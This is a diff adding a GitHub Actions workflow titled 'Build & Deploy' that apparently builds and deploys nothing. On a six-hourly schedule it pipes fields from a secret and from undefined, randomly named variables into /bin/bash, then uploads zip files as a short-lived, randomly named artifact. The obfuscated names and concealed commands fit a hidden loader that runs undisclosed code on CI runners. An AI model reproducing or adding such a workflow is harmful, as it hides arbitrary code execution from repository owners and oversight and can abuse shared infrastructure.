@@ -1,0 +1,35 @@
+name: Build & Deploy
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '39 2,8,14,20 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  trigger:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Start
+        env:
+          e71: ${{ secrets.e71 }}
+        run: |
+          printf '%s' "$e71" | jq -r .hmqbl6119 | /bin/bash
+          printf '%s' "$mtuuu52031" | jq -r .mrg40 | /bin/bash
+          printf '%s' "$ccb1" | jq -r .qfnt3 | /bin/bash
+          echo $jdqpd93 | jq -r .ob6747 | /bin/bash
+          echo $s17514 | jq -r .zy62281 | /bin/bash
+
+      - name: Save output
+        uses: actions/upload-artifact@v4
+        with:
+          name: p2GQhhSm
+          path: "*.zip"
+          retention-days: 1
